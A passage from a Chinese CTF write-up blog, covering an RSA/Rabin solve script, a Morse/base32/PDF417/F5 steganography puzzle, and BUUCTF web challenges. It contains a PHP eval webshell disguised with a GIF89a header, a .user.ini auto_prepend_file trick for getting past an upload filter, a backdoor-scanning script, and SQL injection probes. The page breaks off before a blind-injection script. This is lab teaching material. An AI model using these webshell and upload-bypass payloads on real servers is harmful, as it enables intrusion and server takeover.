class="number">15653165971272925436189715950306169488648677427569197436559321968692908786349053303839431043588260338317859397537409728729274630550454731306685369845739785958309492188309739135163206662322980634812713910231189563194520522299672424106135656125893413504868167774287157038801622413798125676071689173117885182987841510070517898710350608725809906704505037866925358298525340393278376093071591988997064894579887906638790394371193617375086245950012269822349986482584060745112453163774290976851732665573217485779016736517696391513031881133151033844438314444107440811148603369668944891577028184130587885396017194863581130429121</span></span><br><span class="line">n2 = <span class="number">16489315386189042325770722192051506427349661112741403036117573859132337429264884611622357211389605225298644036805277212706583007338311350354908188224017869204022357980160833603890106564921333757491827877881996534008550579568290954848163873756688735179943313218316121156169277347705100580489857710376956784845139492131491003087888548241338393764269176675849400130460962312511303071508724811323438930655022930044289801178261135747942804968069730574751117952892336466612936801767553879313788406195290612707141092629226262881229776085126595220954398177476898915921943956162959257866832266411559621885794764791161258015571</span></span><br><span class="line">key_encode = <span class="number">154190230043753146353030548481259824097315973300626635557077557377724792985967471051038771303021991128148382608945680808938022458604078361850131745923161785422897171143162106718751785423910619082539632583776061636384945874434750267946631953612827762111005810457361526448525422842867001928519321359911975591581818207635923763710541026422076426423704596685256919683190492684987278018502571910294876596243956361277398629634060304624160081587277143907713428490243383194813480543419579737033035126867092469545345710049931834620804229860730306833456574575819681754486527026055566414873480425894862255077897522535758341968447477137256183708467693039633376832871571997148048935811129126086180156680457571784113049835290351001647282189000382279868628184984112626304731043149626327230591704892805774286122197299007823500636066926273430033695532664238665904030038927362086521253828046061437563787421700166850374578569457126653311652359735584860062417872495590142553341805723610473288209629102401412355687033859617593346080141954959333922596227692493410939482451187988507415231993</span></span><br><span class="line">p = gmpy2.gcd(n1, n2)</span><br><span class="line">q = n1/p</span><br><span class="line">e1 = <span class="number">125794</span></span><br><span class="line">e2 = <span class="number">42373</span></span><br><span class="line">b = gmpy2.gcd(e1, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">bd = gmpy2.invert(e1/b, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">s = pow(c1, bd, n1)</span><br><span class="line"></span><br><span class="line">u = pow(s,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">v = pow(s,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">s = gmpy2.invert(p,q)</span><br><span class="line">t = gmpy2.invert(q,p)</span><br><span class="line">x = (t*q*u+s*p*v)%n1</span><br><span class="line">x2 = -x%n1</span><br><span class="line">y = (t*q*u-s*p*v)%n1</span><br><span class="line">y2 = -y%n1</span><br><span class="line">might_s = [x, x2, y, y2]</span><br><span class="line">might_d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> might_s:</span><br><span class="line">    might_d.append(int(gmpy2.invert(e2, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)*(i<span class="number">-1</span>))))</span><br><span class="line"></span><br><span class="line">might_key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    might_key.append(pow(key_encode, might_d[i], p*q*might_s[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = <span class="number">17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br><span class="line">key = <span class="number">42580132829749909635949545500710961386423741815111173311539127124848530560526050611168224706289064276</span></span><br><span class="line">dec = key^enc</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(dec)</span><br><span class="line">mask = int(<span class="string">'1'</span>*<span class="number">335</span>,<span class="number">2</span>)</span><br><span class="line">dec = (dec ^ dec&gt;&gt;<span class="number">200</span>)&amp;mask</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(dec)</span><br></pre></td></tr></table></figure>

<h2 id="Misc-code-in-morse"><a href="#Misc-code-in-morse" class="headerlink" title="Misc-code_in_morse"></a>Misc-code_in_morse</h2><p>考察基本的流量分析、morse编码，base32解码转图片，PDF417图片的识别以及F5隐写。</p>
<h3 id="题目分析-8"><a href="#题目分析-8" class="headerlink" title="题目分析"></a>题目分析</h3><p>拿到流量包之后导出<code>HTTP</code>数据，发现一共四个文件，在<code>PNG</code>文件中拿到了morse码，到网站解码得到一串base32码，这个时候到网站上解base32解不出来，就用python解了一下，发现是一堆hex，其中还有<code>PNG</code>字样，断定是图片的数据，写了个脚本导入到<code>png</code>图片：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">b32 = <span class="string">"RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776R5GE6YNAWJPUA4ZBZM6M5ZPRVWIURUHGMBRAMU7T3P57X776PP5DOBIQIXQE2RCZC5EYFWBAESRALQNACALVNE4B2TCABEA4XIZQAVKFXW632O3XS5HZT7R2J747545E4Y7K6HJA7WI5Y62W4OH7HJ75RL2VOMUMN2OOXOWU7RXV7U6D7AFC2X6TBGSDQII3ABOUCCARS2Q7CAATKD2HRTI6JKAZNIXYGK3ZO4POZENG566RDQVSAKWF26VLJJPC5VD2FAATKAMCHTP27Y5IKTWNNAKLVNEPUXLH6XVICOQMXGHEPDBYZYXZ2R6KKTU7ZF7X2CBGUXSOSHICOPIPQCJNAT3JO5ND5OHLBW5BF4CWNI5BFKTERWIUWFZYKVVKURWS7PI4FEXURAUFXBD6JQKSPZFJ7EXRCPEUSHJMS7GVKVDOG7W6F4ZL4XILUVCKWGFZ3KV2I5WBR7R2QALVHNSEWCKDCIXCA3VJU2QAJVCUZSO3LZICZJAASKAD2LKQ6BLVPQLUDSDLFPZP2WOTPLVLNABG7SPICMT3K52QLTWK3Y4NBXIMX5NRKJIA5FLO6Y3LVP55BPDITRVN2UYEZ33ERFZ2R4KTFVJVECKKRXKA2LRCKQFHEAIEAKZWYCKXRXLGJYJXQKZ445HWLUPAFGIC7FV46SB5MERIYNWSHUCNUQP5OB4S2BDQ7627HULZQRW3QYNKQKU3VHCNJSU6E36IUEPU2TBGKZOSB22N2R6TPY7XUG32VIXLTHGHJXGWNWMTJOGFMAJHOVWIIGDSG2KOONGK7UDFQS4ZOK2OAXKAXWZRTOTZQ2Q7CKRKRWAK6IAK2SRYLT72DGHQXRJGGDN57EJBZ2M7VJHOGJKEHU5ASU2KKTFB4SW5MB5C4YR4SSKNON3XLSS6K7CGJKAZNIP6E7RVUY6OFIBTTXYREMWKWPIDKRPTJSMRJPUXKUOWT5IZP3HEJ65OYVILIUGUI2QHGH32VAAXKO23H2BTIAF2UF4QESSANVEKPILOY63ZA5GUZRLLCIQSY6IRWLSTWULC5KBRAFOQPPEED3VB6IKKDRSN2FF4UVXS7KT6TUQCRQZ2DXZS5AYOCLLHKK6I2JUPRSK2HVI3YKBTZXWQDNGI3FMYHFMO3BIYABKUPTFSK3J4KKPKNALUMP5NFERHUB3I7IWTXQEAAMQUPQGRADFFIMKQ3MQNX3BW7NU4WMITZDB5D3FP3VHD2SPCX65ZVL44VUHQMAHMZLQFKADBFIO2RRKTCDYZJ2BCENKZ2LY2TIKSH3MMU3EUB5T26E4TP4NK3F6KRSTI3TEKTBKXTJYKHQATMWUDXT5T4CUYXK6U5H2LYAKUO5LJIFS2QY4O7KZP3KBCODRBAGLKPDN5WUTLOAKEOJP22CBGU6GXYJUPRTXXHKJLP7D46I2TPFLWQRJ4NIEFDYSNKDYFCERFHAC5NIWXVQXELIUSGKLKZLGT36JMOS7IIPBU76KXNQDJV4ZSXCE7F5P4U4QIRAKPAWRQFJLVHRFJDKIVLAVFOORM7F5S3U5D6AIFDV27JYJ243PIM6UKVSGLKQIZACNKPHVJAQJNPUAWACJNAWYEJBR2Q6LTA3STOLSLO6QZFKQ5QGFEZ5TKCJJ6VKBVNVO7DKG27T3HHJDRVXTPD6H7EW6FI6QB5GHQVKU3VP54TBBQMIDFJ6QFKRZXP4UE2QG3EVJDK3AASKBCE5W3VDHVB4JVC7IXOG5C7J4MZWSRDJFSHKH626LIUGRPZ6T2SEANVP5KDXFNKGQIWQS5J5MC5HBH5GGTHZLGWXKOWSCRQNULFGO4C3ZHUZF6O57K4YV2VYUR5BF3PDMEKR7JZEZJAAEUUORJ32GSHIAG4OWQS5LPPKVU2J7P5AQUQWRK7HE5BX3UWXJNPSKKBICC5Z5Y5L7AESSANUYPUNR2USESHE2ORQMJ5H6KTB6YSTVZD3FA6NLBUASWRM6VZYTXV6E4J6SW2XLZ6RGW7JL5FECJ53N7KRKRXMJGKVJTH6FNIFIOOA26AFHEAXJCUAQGBON2UPZNMBRKW7ZKUDZFYMCQBE5B4SUCTJ6TIOOT6J2XVXXLVRMPT3VGQUCSIAU4DKFJ7535XXUWGDSV3DJHQ2SXK3PILDELUPQVAVKFKJQM2GO47WTXXIZQPKNAE2VSDIDGT2VSSNUFSQAJV7WEY2WKVFSQANMFERVARSSUGEJ7TZLISVGYVPGPSVZTRTRYZXVI6VNNIZ6LFNPL2VAQVECPVZYLF3BR2M2PCXAF5USD6UVR7STM27OSOM7D3XUU2RZD5KWOKSBKIKLW3Q6VCIJTFVJLQDBREGECQBDKTJETLKU5KYQJVABNCATKD4MCVP6G75HT2V4CPQSW64SMM2VIBS2Q65ENEIBIETVJ5MFEFVLPEZXG3JEXX4QXSSUAABGMN67M5CJJVGTWUOS7742UGJK6VG2TGVFVCIYCUE2L44E2VBFJHTFNT7URWE6HSIZ2PF5TR7QST3FEAXIWSCMJO4V74VEACNKEGJF3B2IDGRF3BRAYWTALFVCFR7IZCNGVDEUSAZURUGABG5H6TDDKNEVH4TWZC2DI6FR6XT6W64SDC2JY3WDEXTLOK4ZBKPEXZMPFC4RFCFU5KQ6AEDV6T2MGAJ7HUQQUXSPY2U6VFNR3YDVWWKLK54UE2RPPUBGUJHDZ5SGMUY563JFZIRAPIXIGHLD2Q5IMUQOWIGOS2OADI4FPZ3GPJHQV2BU74SW6AUSPXX57VPJ24ZFJ7FNQIURSX6KQZGLKPDN5TLRKZZEGEN6K7T65EHP2X7E54M4AZQVRPFHRVDOZBLVAJFSHUPIVMTKKFUF4C2X7FBGUNWESTWFYXM37PZIBXQMWUERWUSQTFVD65OZR7YZBUACNIP46K3EQXWY5SUSIYGESUH3NLI6FI6DAFNUHQD5KLADK23QWSXWV4UE2RTF6HNMZWTVLVVZMN6NGKXOPO7AKI7ZO2AYBGV7YFMMCAQKQ65D6VINJOPMPKVO3XS73ICKETFERWLKCFX5YEYQA566QZJPETH7AKRZBJPENQNUWN4K2DYTNLWDKPY2WKGMDCIC5QRQUSO42ZPETOUO3VHUIJSVHSN3UXZ2B6OR6ZYB2J4KX5W6QRKB5QMEKQQVTTVO2LJYMULY2WDFFQWROXMWUELDVPZBIDFVAWQFLR6AJ6POOEHBW2U4UDC7S2FRU4VC47P3WQJ4BROGKLYQXSVIHLE7ZXAIKID2LZFB5JHV4NIAKQCAJFGYXI3AEAXI2JYDRGUDCMBJIR7ABXO3NF6UIUKCLNAAAAAACJIVHEJLSCMCBA===="</span></span><br><span class="line">hex = base64.b32decode(b32)</span><br><span class="line">print(hex)</span><br><span class="line">f1 = open(<span class="string">"1.png"</span>,<span class="string">'wb'</span>)</span><br><span class="line">f1.write(hex)</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>

<p>然后拿到了如下一张图：<br><img src="http://www.ggb0n.cool/images/ichunqiu23.png" alt=""><br>后来得知是<code>PDF417</code>，然后到网上找了一下扫描的方法，<a href="https://online-barcode-reader.inliteresearch.com/">这里</a>和<a href="https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx">这里</a>都可以识别，识别出了下面这个图：<br><img src="http://www.ggb0n.cool/images/ichunqiu24.jpg" alt=""><br>这里卡了好久，要不是就拿到了二血了…<br>后来看到图片的标题<code>F5</code>得知是<code>F5</code>隐写，然后用<a href="https://github.com/matthewgao/F5-steganography">F5-steganography</a>跑出了flag。<br><img src="http://www.ggb0n.cool/images/ichunqiu1.png" alt=""></p>
<p>这里偶然间发现了一个更好用的工具，输入morse码就直接出了PDF417的图，分享一下：<a href="https://gchq.github.io/CyberChef/">CyberChef</a>，只能说，师傅们tql!</p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTF学习记录</a><span> </span><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/">反序列化逃逸漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/SSRF/">SSRF</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">堆叠注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/bypass-functions-disable/">bypass functions_disable</a><span> </span><a class="article-more button is-small link-muted" href="/tags/RSA%E6%94%BB%E5%87%BB/">RSA攻击</a><span> </span><a class="article-more button is-small link-muted" href="/tags/SSTI/">SSTI</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">宽字节注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%88%A9%E7%94%A8%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5/">利用正则注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%88%A9%E7%94%A8Handler%E6%B3%A8%E5%85%A5/">利用Handler注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%88%A9%E7%94%A8%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">利用预处理语句进行堆叠注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%A4%9A%E5%88%97%E6%95%B0%E6%8D%AE%E7%88%86%E7%A0%B4%E6%B3%A8%E5%85%A5/">多列数据爆破注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/PDF417%E8%AF%86%E5%88%AB/">PDF417识别</a><span> </span><a class="article-more button is-small link-muted" href="/tags/F5%E9%9A%90%E5%86%99/">F5隐写</a><span> </span><a class="article-more button is-small link-muted" href="/tags/ThinkPHP6-0-%E9%80%9A%E8%BF%87SEESION%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/">ThinkPHP6.0-通过SEESION写文件漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/Rabin%E7%AE%97%E6%B3%95%E6%94%BB%E5%87%BB/">Rabin算法攻击</a><span> </span><a class="article-more button is-small link-muted" href="/tags/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/">RSA共模攻击</a><span> </span><a class="article-more button is-small link-muted" href="/tags/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">JS原型链污染</a><span> </span><a class="article-more button is-small link-muted" href="/tags/CRLF%E6%B3%A8%E5%85%A5/">CRLF注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/Node-js%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8/">Node js编码安全</a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-02-06T16:00:07.000Z">2020-02-07</time><span class="level-item">an hour read (About 8487 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/">BUUCTF-web刷题Ⅰ</a></h1><div class="content"><h2 id="BUUCTF-WEB刷题记录"><a href="#BUUCTF-WEB刷题记录" class="headerlink" title="BUUCTF-WEB刷题记录"></a>BUUCTF-WEB刷题记录</h2><p>在家圈着，有时间可以好好刷刷题了，看glzjin处处打广告，早就想把BUU的题好好刷刷了，从现在开始吧！</p>
<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入链接之后是下图的页面：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web2.png" alt=""><br>提示我们源码在<code>www.tar.gz</code>中，那么我们把源码下载下来进行审计。<br>发现是这个压缩包包含了几千个php文件，并且每个文件里代码都不少，参数也都是乱序字母，像是经过加密的一样…<br><img src="http://www.ggb0n.cool/images/BUUCTF-web0.png" alt=""><br>但是，经过审计代码，我们发现，很多文件中都包含了不少的<code>GET</code>和<code>POST</code>方式进行传参的代码，并且还有很多调用<code>eval</code>的地方，这不就是后门嘛，但是经过测试，在<code>eval</code>调用的参数中传入命令没有效果…<br>这么多文件，每个文件又是这么多参数和<code>eval</code>的调用，猜测是在某个文件中包含可以成功拿到<code>shell</code>的参数和<code>eval</code>调用，这么多文件，只好写脚本进行测试，来找到存在后门的文件了。</p>
<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><p>这里参考一个工作效率比较高的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：  '</span>+ time.asctime(time.localtime(time.time())))</span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#信号量，设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r"F:/phpStudy_64/phpstudy_pro/WWW/src/"</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											<span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span></span><br><span class="line">    s1.acquire()                                                    <span class="comment">#每当调用acquire()时内置计数器-1</span></span><br><span class="line">    print(<span class="string">'trying   '</span>+file+<span class="string">'     '</span>+time.asctime(time.localtime(time.time())))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1/src/'</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求,释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?%s='</span>%a+<span class="string">"echo 'xxxxxx';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求,释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">"echo 'xxxxxx';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'找到了利用文件： '</span>+file+<span class="string">"  and 找到了利用的参数：%s"</span> %param)</span><br><span class="line">        print(<span class="string">'结束时间：  '</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
<p>这个脚本会输出存在后门的文件名和可以拿到<code>shell</code>的参数，我们拿到参数之后，再传参，<code>url</code>参数内容为<code>cat /flag</code>即可拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web1.png" alt=""></p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>打开链接，是一个文件上传页面，第一反应上传图片马<br><img src="http://www.ggb0n.cool/images/BUUCTF-web3.png" alt=""><br>结果显示<code>&lt;? in contents!</code>这提示我们上传的图片马中不能包含<code>&lt;?</code>，同时也得知是黑名单过滤了，那么可以利用<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马来绕过过滤，和NCTF中的一道题是一样的知识点。我们构造这种图片马上传，回显如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web4.png" alt=""><br>提示<code>exif_imagetype:not image!</code>，猜测后端应该调用了php的<code>exif_imagetype()</code>函数，这个在图片马中添加图片文件头就可以绕过，这里添加<code>GIF89a</code>来绕过，上传之后回显如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web5.png" alt=""><br>我们看到，文件成功上传，但是现在用蚁剑链接的话，还是失败，因为传上去的带图片文件头的图片马并没有被解析，因此需要上传<code>.htaccess</code>文件或者<code>.user.ini</code>文件来解析图片马。这里服务器版本比较高不能用<code>.htaccess</code>来解析，那么便需要用<code>.user.ini</code>来解析我们上传的图片马。</p>
<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>这是一个与php配置相关的文件，可以在php手册查看对其的描述：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web6.png" alt=""><br>从官方描述中我们看到<code>.user.ini</code>可以支持用户配置<code>php.ini</code>中的<strong>PHP_INI_PERDIR</strong>和<strong>PHP_INI_USER</strong>，只要是在<code>CGI/FastCGI</code>模式的服务器上都支持<code>.user.ini</code>。<br>同时我们在官方手册关于<strong>php.ini配置选项列表</strong>的描述中看到<code>auto_append_file</code>和<code>auto_prepend_file</code>都适用在<strong>PHP_INI_PERDIR</strong>中，即可以通过<code>.user.ini</code>来配置它们。我们需要知道这两个配置的作用：</p>
<ul>
<li>1、auto_append_file：指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了<code>require()</code>函数。</li>
<li>2、auto_prepend_file：指定一个文件，自动包含在要执行的文件后，但是如果在包含之前遇到<code>exit()</code>函数便不会包含。</li>
<li>它们的使用方法是直接写在<code>.user.ini</code>中即可，如：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_append_file=<span class="number">01.</span>gif</span><br><span class="line">auto_prepend_file=<span class="number">01.</span>gif</span><br></pre></td></tr></table></figure>

<p>至此，我们的解题思路就很明确了：</p>
<ul>
<li>1、构造包含<code>GIF89a</code>的图片马</li>
<li>2、图片马用<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的代码</li>
<li>3、构造<code>.user.ini</code>文件，其中包含我们要上传的图片马名称</li>
<li>4、先传入<code>.user.ini</code>然后上传图片马</li>
<li>5、蚁剑连接，拿flag</li>
</ul>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p><strong>构造图片马：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">'x'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>构造.user.ini文件</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="built_in">auto</span>_prepend_file=xxx.jpg <span class="comment">//注意：该处的名称要与图片马的名称相同</span></span><br></pre></td></tr></table></figure>
<p>将构造好的文件依次上传，然后拿到文件储存的路径，这里需要说明：前面讲过了，<code>auto_append_file</code>和<code>auto_prepend_file</code>的作用是在<strong>在要执行的文件</strong>中包含我们指定的文件，在回显中我们看到，相同文件夹下还包含<code>index.php</code>文件，那么利用它便可以拿到<code>shell</code>。<br><strong>蚁剑连接拿flag</strong><br>用蚁剑连接，在根目录即可拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web7.png" alt=""><br>关于<code>.user.ini</code>文件构成的php后门还可以参考：<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
<h2 id="CISCN-2019华北-HackWorld"><a href="#CISCN-2019华北-HackWorld" class="headerlink" title="[CISCN 2019华北]HackWorld"></a>[CISCN 2019华北]HackWorld</h2><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>打开链接看到如下的输入框：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web8.png" alt=""><br>提示我们flag在<code>flag</code>表中的<code>flag</code>字段，一个SQL注入题，抓包发现输入框的值会通过参数<code>id</code>以<code>POST</code>的方式上传到服务端。<br>测试对输入的限制，结果如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>=1  Hello, glzjin wants a girlfriend.</span><br><span class="line"><span class="attribute">id</span>=1' bool(<span class="literal">false</span>)</span><br><span class="line"><span class="attribute">id</span>=1'+空格 SQL Injection Checked.</span><br><span class="line"><span class="attribute">id</span>=1'#    SQL Injection Checked.</span><br></pre></td></tr></table></figure>
<p>我们发现，当输入为1的时候回显<code>Hello, glzjin wants a girlfriend.</code>应该是一个正确的回显，但是输入<code>1&#39;</code>回显<code>bool(false)</code>，并且对于与注入相关的字符会回显<code>SQL Injection Checked.</code>，因此，判断是一个布尔盲注。<br>当输入的表达式为<code>1</code>的时候，会给出正确的回显，那么我们便可以通过在输入框构造结果为<code>1</code>并且逐字符地读取<code>flag</code>字段内容的语句便可以读出flag。</p>
<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>可以用下面的布尔盲注脚本拿flag：</p>
